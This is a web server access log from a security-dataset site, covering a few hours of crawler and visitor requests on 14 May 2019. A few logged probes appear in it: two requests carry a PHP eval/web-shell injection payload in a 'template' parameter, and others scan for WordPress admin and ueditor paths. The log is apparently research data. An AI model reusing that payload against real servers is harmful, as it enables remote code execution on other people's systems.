61.197.159.13 - - [14/May/2019:01:44:39 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
61.197.159.13 - - [14/May/2019:01:44:39 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
61.197.159.13 - - [14/May/2019:01:44:39 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
61.197.159.13 - - [14/May/2019:01:44:40 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
40.77.167.56 - - [14/May/2019:01:46:49 -0700] "GET /self.logs/access.log.2017-12-14.gz HTTP/1.1" 200 24894 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
216.244.66.245 - - [14/May/2019:01:47:21 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
64.233.173.19 - - [14/May/2019:01:47:21 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Linux; Android 9; CLT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" 
64.233.173.17 - - [14/May/2019:01:47:22 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 9; CLT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" 
64.233.173.17 - - [14/May/2019:01:47:22 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 9; CLT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" 
64.233.173.17 - - [14/May/2019:01:47:23 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 9; CLT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" 
40.77.167.59 - - [14/May/2019:01:51:43 -0700] "GET /self.logs/2015/error.log.2015-01-31.gz HTTP/1.1" 200 769 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
42.51.43.140 - - [14/May/2019:01:59:33 -0700] "GET /type.php?template=tag_()%7B%7D;@unlink(FILE);eval($_POST[qazw]);print(md5(999));%7B//../rss HTTP/1.1" 301 654 "-" "python-requests/2.21.0" 
42.51.43.140 - - [14/May/2019:01:59:35 -0700] "GET /type.php?template=tag_()%7B%7D;@unlink(FILE);eval($_POST[qazw]);print(md5(999));%7B//../rss HTTP/1.1" 404 340 "-" "python-requests/2.21.0" 
157.55.39.206 - - [14/May/2019:02:02:31 -0700] "GET /self.logs/error.log.2017-06-21.gz HTTP/1.1" 200 934 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
106.120.173.159 - - [14/May/2019:02:03:34 -0700] "GET /robots.txt HTTP/1.1" 200 252 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.120.173.159 - - [14/May/2019:02:03:39 -0700] "GET /robots.txt HTTP/1.1" 301 481 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.120.173.159 - - [14/May/2019:02:05:55 -0700] "GET / HTTP/1.1" 301 446 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
216.244.66.245 - - [14/May/2019:02:06:38 -0700] "GET /self.logs/access.log.2018-02-03.gz HTTP/1.1" 200 22919 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
106.120.173.159 - - [14/May/2019:02:06:49 -0700] "GET / HTTP/1.1" 200 12474 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.120.173.159 - - [14/May/2019:02:07:15 -0700] "GET / HTTP/1.1" 200 12474 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
115.156.141.16 - - [14/May/2019:02:09:11 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Safari/605.1.15" 
115.156.141.16 - - [14/May/2019:02:09:11 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Safari/605.1.15" 
115.156.141.16 - - [14/May/2019:02:09:12 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Safari/605.1.15" 
192.185.4.157 - - [14/May/2019:02:13:20 -0700] "GET /test/wp-admin/ HTTP/1.1" 301 489 "-" "-" 
193.36.230.100 - - [14/May/2019:02:13:22 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
193.36.230.100 - - [14/May/2019:02:13:22 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
193.36.230.100 - - [14/May/2019:02:13:22 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
193.36.230.100 - - [14/May/2019:02:13:27 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
193.36.230.100 - - [14/May/2019:02:13:32 -0700] "GET /squid/access.log.gz HTTP/1.1" 200 2307942 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
193.36.230.100 - - [14/May/2019:02:14:14 -0700] "GET /squid/access.log.gz HTTP/1.1" 200 23177322 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.108 Safari/537.36" 
101.89.29.94 - - [14/May/2019:02:16:31 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 696420 "-" "Mozilla/5.0 (Linux; Android 6.0.1; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.9 TBS/036906 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" 
157.55.39.35 - - [14/May/2019:02:19:46 -0700] "GET /robots.txt HTTP/1.1" 301 502 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.35 - - [14/May/2019:02:19:46 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.149 - - [14/May/2019:02:19:51 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
185.219.238.38 - - [14/May/2019:02:20:28 -0700] "GET /wordpress/wp-admin/ HTTP/1.1" 301 499 "-" "-" 
114.247.56.255 - - [14/May/2019:02:21:03 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36" 
114.247.56.255 - - [14/May/2019:02:21:05 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36" 
114.247.56.255 - - [14/May/2019:02:21:05 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36" 
114.247.56.255 - - [14/May/2019:02:22:11 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36" 
213.174.152.182 - - [14/May/2019:02:25:45 -0700] "GET /robots.txt HTTP/1.1" 301 462 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.182 - - [14/May/2019:02:25:50 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
157.55.39.149 - - [14/May/2019:02:25:54 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
162.249.5.6 - - [14/May/2019:02:27:14 -0700] "GET /blog/wp-admin/ HTTP/1.1" 301 489 "-" "-" 
113.171.224.176 - - [14/May/2019:02:29:27 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
52.38.236.245 - - [14/May/2019:02:29:55 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18" 
52.38.236.245 - - [14/May/2019:02:29:56 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18" 
138.201.246.6 - - [14/May/2019:02:30:45 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36" 
41.223.160.131 - - [14/May/2019:02:31:05 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
158.199.144.10 - - [14/May/2019:02:34:11 -0700] "GET /wp/wp-admin/ HTTP/1.1" 301 485 "-" "-" 
41.223.160.131 - - [14/May/2019:02:35:31 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
65.39.211.246 - - [14/May/2019:02:41:06 -0700] "GET /old/wp-admin/ HTTP/1.1" 301 487 "-" "-" 
66.249.88.175 - - [14/May/2019:02:43:27 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Google (+https://developers.google.com/+/web/snippet/)" 
66.249.88.173 - - [14/May/2019:02:43:27 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Google (+https://developers.google.com/+/web/snippet/)" 
14.139.93.243 - - [14/May/2019:02:46:38 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" 
14.139.93.243 - - [14/May/2019:02:46:39 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" 
14.139.93.243 - - [14/May/2019:02:46:39 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" 
14.139.93.243 - - [14/May/2019:02:46:40 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" 
40.77.167.56 - - [14/May/2019:02:50:20 -0700] "GET /self.logs/error.log.2017-08-09.gz HTTP/1.1" 301 545 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
119.36.214.3 - - [14/May/2019:02:51:26 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36" 
119.36.214.3 - - [14/May/2019:02:51:27 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36" 
119.36.214.3 - - [14/May/2019:02:51:29 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36" 
119.36.214.3 - - [14/May/2019:02:51:29 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36" 
42.236.10.93 - - [14/May/2019:02:52:01 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
14.139.93.243 - - [14/May/2019:02:52:08 -0700] "GET /maccdc2012/signatures.log.gz HTTP/1.1" 200 605 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" 
42.236.10.93 - - [14/May/2019:02:52:21 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
42.236.10.84 - - [14/May/2019:02:52:26 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
123.176.46.34 - - [14/May/2019:02:52:30 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
123.176.46.34 - - [14/May/2019:02:52:30 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
123.176.46.34 - - [14/May/2019:02:52:30 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
180.163.220.68 - - [14/May/2019:02:52:38 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
119.36.214.3 - - [14/May/2019:02:52:42 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36" 
180.163.220.3 - - [14/May/2019:02:52:44 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
180.163.220.68 - - [14/May/2019:02:52:49 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
180.163.220.4 - - [14/May/2019:02:52:49 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
35.192.187.174 - - [14/May/2019:02:53:09 -0700] "GET / HTTP/1.1" 200 12455 "-" "awesome_bot" 
14.215.176.145 - - [14/May/2019:02:54:14 -0700] "GET / HTTP/1.1" 200 12511 "http://www.baidu.com/s?wd=takenji8" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
157.55.39.149 - - [14/May/2019:02:55:02 -0700] "GET /self.logs/access.log.2018-07-23.gz HTTP/1.1" 200 25369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.53 - - [14/May/2019:02:55:15 -0700] "GET /self.logs/2016/error.log.2016-04-25.gz HTTP/1.1" 200 1257 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.149 - - [14/May/2019:02:57:14 -0700] "GET /self.logs/2016/access.log.2016-01-18.gz HTTP/1.1" 200 7347 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
216.244.66.245 - - [14/May/2019:03:19:46 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
106.120.173.88 - - [14/May/2019:03:22:04 -0700] "GET /robots.txt HTTP/1.1" 200 252 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.120.173.88 - - [14/May/2019:03:22:05 -0700] "GET / HTTP/1.1" 200 12474 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
207.46.13.221 - - [14/May/2019:03:24:23 -0700] "GET /self.logs/2016/error.log.2016-01-25.gz HTTP/1.1" 200 688 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.56 - - [14/May/2019:03:25:17 -0700] "GET /self.logs/2015/error.log.2015-12-30.gz HTTP/1.1" 200 871 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
209.17.96.18 - - [14/May/2019:03:28:47 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)" 
113.171.224.176 - - [14/May/2019:03:34:32 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
157.55.39.53 - - [14/May/2019:03:34:32 -0700] "GET /self.logs/2016/error.log.2016-02-13.gz HTTP/1.1" 200 849 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.56 - - [14/May/2019:03:35:59 -0700] "GET /self.logs/2016/error.log.2016-12-04.gz HTTP/1.1" 200 756 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.249.64.190 - - [14/May/2019:03:37:18 -0700] "GET /ads.txt HTTP/1.1" 301 494 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
216.244.66.245 - - [14/May/2019:03:37:25 -0700] "GET /self.logs/access.log.2019-02-04.gz HTTP/1.1" 200 18138 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
35.188.73.34 - - [14/May/2019:03:46:03 -0700] "GET / HTTP/1.1" 200 12455 "-" "awesome_bot" 
193.38.139.42 - - [14/May/2019:03:46:10 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
193.38.139.42 - - [14/May/2019:03:46:11 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27751 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
193.38.139.42 - - [14/May/2019:03:46:12 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7391 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
193.38.139.42 - - [14/May/2019:03:51:14 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 553 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
162.210.196.100 - - [14/May/2019:03:52:54 -0700] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.100 - - [14/May/2019:03:52:55 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.100 - - [14/May/2019:03:52:56 -0700] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.100 - - [14/May/2019:03:52:58 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.100 - - [14/May/2019:03:53:00 -0700] "GET / HTTP/1.1" 200 12455 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
40.77.167.56 - - [14/May/2019:03:53:12 -0700] "GET /self.logs/access.log.2018-06-10.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
172.101.129.128 - - [14/May/2019:03:54:45 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
172.101.129.128 - - [14/May/2019:03:54:46 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
172.101.129.128 - - [14/May/2019:03:54:46 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
172.101.129.128 - - [14/May/2019:03:54:46 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
172.101.129.128 - - [14/May/2019:03:54:46 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
172.101.129.128 - - [14/May/2019:03:55:44 -0700] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 200 1355 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
172.101.129.128 - - [14/May/2019:03:55:44 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
35.202.145.110 - - [14/May/2019:04:10:41 -0700] "GET / HTTP/1.1" 200 12455 "-" "awesome_bot" 
66.249.93.77 - - [14/May/2019:04:11:31 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.249.93.77 - - [14/May/2019:04:11:31 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
216.244.66.245 - - [14/May/2019:04:13:30 -0700] "GET /self.logs/access.log.2019-02-04.gz HTTP/1.1" 200 18138 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
157.55.39.53 - - [14/May/2019:04:28:16 -0700] "GET /self.logs/access.log.2017-12-02.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
114.115.203.130 - - [14/May/2019:04:30:23 -0700] "GET /admin/ueditor/php/controller.php HTTP/1.1" 404 295 "http://www.secrepo.com/admin/ueditor/php/controller.php" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" 
188.84.26.33 - - [14/May/2019:04:31:14 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 54258816 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
157.55.39.206 - - [14/May/2019:04:31:47 -0700] "GET /self.logs/2015/error.log.2015-10-22.gz HTTP/1.1" 200 995 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.98 - - [14/May/2019:04:34:17 -0700] "GET /self.logs/access.log.2017-03-28.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.206 - - [14/May/2019:04:36:08 -0700] "GET /self.logs/error.log.2018-01-13.gz HTTP/1.1" 200 1687 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
188.84.26.33 - - [14/May/2019:04:38:40 -0700] "GET /self.logs/ HTTP/1.1" 200 16421 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
188.84.26.33 - - [14/May/2019:04:38:41 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
188.84.26.33 - - [14/May/2019:04:38:44 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 23085976 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
113.171.224.176 - - [14/May/2019:04:40:41 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
